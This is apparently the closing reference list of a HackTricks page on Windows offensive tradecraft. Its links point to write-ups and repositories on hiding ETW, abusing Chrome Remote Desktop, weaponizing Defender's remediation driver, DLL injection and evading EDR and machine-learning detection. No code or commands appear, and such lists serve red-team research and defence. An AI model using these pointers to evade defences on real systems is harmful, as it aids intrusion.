- [33] [blog.xpnsec.com - Hiding Your Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abusing Chrome Remote Desktop On Red Team Operations A Practical Guide](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Weaponizing Defender's Remediation Driver as a Kernel Operation Primitive](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo companion code](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Crafting Self-Masking Functions Using LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole source](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe function](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Creating a Child Process with Redirected Input and Output](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: Reforging C# Tools with WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Compiling C# / .NET Projects](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty proof-of-concept and source](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Abusing thread pool internals for shellcodeless DLL injection](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [EMBER2024 benchmark dataset and thrember tooling](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Using EMBER2024 to evaluate red team implants](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Evading Machine Learning Based Detections](https://msecops.de/blog/posts/ml-evasion/)

{{#include ../banners/hacktricks-training.md}}
